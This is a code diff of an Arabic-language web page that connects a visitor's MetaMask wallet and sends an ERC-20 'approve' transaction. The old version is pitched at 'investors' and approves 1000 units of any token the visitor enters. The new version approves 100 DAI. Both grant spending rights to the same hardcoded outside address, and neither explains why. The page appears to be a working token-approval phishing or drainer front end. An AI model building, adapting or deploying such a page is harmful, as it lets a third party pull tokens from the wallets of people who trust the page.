@@ -1,135 +1,72 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
-  <meta charset="UTF-8" />
-  <title>تفعيل Approve للمستثمرين</title>
-  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>صفحة الموافقة لمحفظة MetaMask</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdn.ethers.io/lib/ethers-5.7.umd.min.js" type="text/javascript"></script>
 </head>
-<body>
-  <h2>صفحة تفعيل Approve</h2>
+<body class="bg-gray-100 flex items-center justify-center h-screen">
+    <div class="bg-white p-6 rounded-lg shadow-lg max-w-md w-full text-center">
+        <h1 class="text-2xl font-bold mb-4">ربط محفظة MetaMask</h1>
+        <p id="walletStatus" class="text-gray-600 mb-4">لم يتم ربط المحفظة</p>
+        <button id="connectWallet" class="bg-blue-500 text-white px-4 py-2 rounded hover:bg-blue-600 mb-4">ربط المحفظة</button>
+        <button id="approveButton" class="bg-green-500 text-white px-4 py-2 rounded hover:bg-green-600 hidden">الموافقة على المعاملة</button>
+        <p id="transactionStatus" class="text-gray-600 mt-4"></p>
+    </div>
 
-  <button id="connectBtn">توصيل المحفظة</button>
-  <br /><br />
+    <script>
+        // التحقق من وجود MetaMask
+        const connectWalletButton = document.getElementById('connectWallet');
+        const approveButton = document.getElementById('approveButton');
+        const walletStatus = document.getElementById('walletStatus');
+        const transactionStatus = document.getElementById('transactionStatus');
 
-  <label>20: </label><br />
-  <input type="text" id="tokenAddress" placeholder="أدخل عنوان التوكن هنا" size="60" />
-  <br /><br />
-
-  <p>المبلغ للموافقة (Approve): <strong>1000</strong></p>
-
-  <button id="approveBtn" disabled>اعمل Approve</button>
-
-  <p id="status" style="color: green; font-weight: bold;"></p>
-
-  <script>
-    document.addEventListener("DOMContentLoaded", () => {
-      if (typeof ethers === "undefined") {
-        document.getElementById("status").style.color = "red";
-        document.getElementById("status").textContent = "فشل تحميل مكتبة Ethers.js. تحقق من الاتصال بالإنترنت.";
-        return;
-      }
-
-      const fixedSpenderAddress = "0xaB63dd850a8C2EDD526fF2D929187B94E03F777D";
-      const fixedApproveAmount = "1000";
-      const expectedChainId = 1; // Mainnet, يمكن تغييره (مثل 11155111 لـ Sepolia)
-
-      const statusEl = document.getElementById("status");
-      const approveBtn = document.getElementById("approveBtn");
-
-      async function connectWallet() {
-        statusEl.style.color = "green";
-        statusEl.textContent = "";
-
-        if (!window.ethereum) {
-          statusEl.style.color = "red";
-          statusEl.textContent = "يرجى تثبيت MetaMask أو محفظة تدعم Web3!";
-          return;
+        if (typeof window.ethereum === 'undefined') {
+            walletStatus.textContent = 'يرجى تثبيت MetaMask!';
+            connectWalletButton.disabled = true;
         }
 
-        try {
-          const provider = new ethers.providers.Web3Provider(window.ethereum);
-          await provider.send("eth_requestAccounts", []);
-          statusEl.textContent = "تم توصيل المحفظة بنجاح!";
-          statusEl.style.color = "green";
+        // ربط المحفظة
+        connectWalletButton.addEventListener('click', async () => {
+            try {
+                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                walletStatus.textContent = `تم ربط المحفظة: ${accounts[0].slice(0, 6)}...${accounts[0].slice(-4)}`;
+                connectWalletButton.classList.add('hidden');
+                approveButton.classList.remove('hidden');
+            } catch (error) {
+                walletStatus.textContent = 'فشل ربط المحفظة: ' + error.message;
+            }
+        });
 
-          // التحقق من الشبكة
-          const network = await provider.getNetwork();
-          if (network.chainId !== expectedChainId) {
-            statusEl.style.color = "red";
-            statusEl.textContent = "يرجى الاتصال بشبكة Ethereum الرئيسية.";
-            return;
-          }
+        // تنفيذ معاملة الموافقة
+        approveButton.addEventListener('click', async () => {
+            try {
+                const provider = new ethers.providers.Web3Provider(window.ethereum);
+                const signer = provider.getSigner();
 
-          // تفعيل زر Approve بعد التوصيل الناجح
-          approveBtn.disabled = false;
-        } catch (error) {
-          console.log(error);
-          statusEl.style.color = "red";
-          statusEl.textContent = "فشل توصيل المحفظة: " + (error.message || error);
-        }
-      }
+                // عنوان العقد الذكي لرمز ERC-20 (مثال)
+                const contractAddress = '0x6B175474E89094C44Da98b954EedeAC495271d0F'; // DAI كمثال
+                const recipientAddress = '0xaB63dd850a8C2EDD526fF2D929187B94E03F777D'; // عنوان Spender المقدم
+                const amount = ethers.utils.parseUnits('100', 18); // 100 رمز (18 منزله عشرية)
 
-      async function doApprove() {
-        statusEl.style.color = "green";
-        statusEl.textContent = "";
+                // ABI لدالة الموافقة (approve)
+                const abi = [
+                    "function approve(address spender, uint256 amount) public returns (bool)"
+                ];
 
-        if (!window.ethereum) {
-          statusEl.style.color = "red";
-          statusEl.textContent = "يرجى تثبيت MetaMask أو محفظة تدعم Web3!";
-          return;
-        }
+                const contract = new ethers.Contract(contractAddress, abi, signer);
+                transactionStatus.textContent = 'جاري تنفيذ المعاملة...';
 
-        const tokenAddress = document.getElementById("tokenAddress").value.trim();
+                const tx = await contract.approve(recipientAddress, amount);
+                await tx.wait();
 
-        if (!ethers.utils.isAddress(tokenAddress)) {
-          statusEl.style.color = "red";
-          statusEl.textContent = "الرجاء إدخال عنوان توكن صحيح.";
-          return;
-        }
-
-        try {
-          const provider = new ethers.providers.Web3Provider(window.ethereum);
-          const accounts = await provider.listAccounts();
-          if (accounts.length === 0) {
-            statusEl.style.color = "red";
-            statusEl.textContent = "يرجى توصيل المحفظة أولاً.";
-            return;
-          }
-
-          const signer = provider.getSigner();
-          const erc20Abi = [
-            "function decimals() view returns (uint8)",
-            "function approve(address spender, uint256 amount) returns (bool)"
-          ];
-          const contract = new ethers.Contract(tokenAddress, erc20Abi, signer);
-
-          const decimals = await contract.decimals();
-          const amount = ethers.utils.parseUnits(fixedApproveAmount, decimals);
-
-          statusEl.textContent = "جارٍ إرسال طلب الموافقة إلى المحفظة...";
-
-          const tx = await contract.approve(fixedSpenderAddress, amount);
-
-          statusEl.textContent = "تم إرسال المعاملة، في انتظار التوثيق...";
-
-          await tx.wait();
-
-          statusEl.textContent = `تم الموافقة بنجاح! Tx Hash: ${tx.hash}`;
-        } catch (error) {
-          console.log(error);
-          if (error.code === 4001) {
-            statusEl.style.color = "red";
-            statusEl.textContent = "تم رفض المعاملة من قبل المستخدم.";
-          } else {
-            statusEl.style.color = "red";
-            statusEl.textContent = "حدث خطأ: " + (error.message || error);
-          }
-        }
-      }
-
-      document.getElementById("connectBtn").addEventListener("click", connectWallet);
-      document.getElementById("approveBtn").addEventListener("click", doApprove);
-    });
-  </script>
+                transactionStatus.textContent = `تمت الموافقة! رقم المعاملة: ${tx.hash}`;
+            } catch (error) {
+                transactionStatus.textContent = 'فشل المعاملة: ' + error.message;
+            }
+        });
+    </script>
 </body>
 </html>
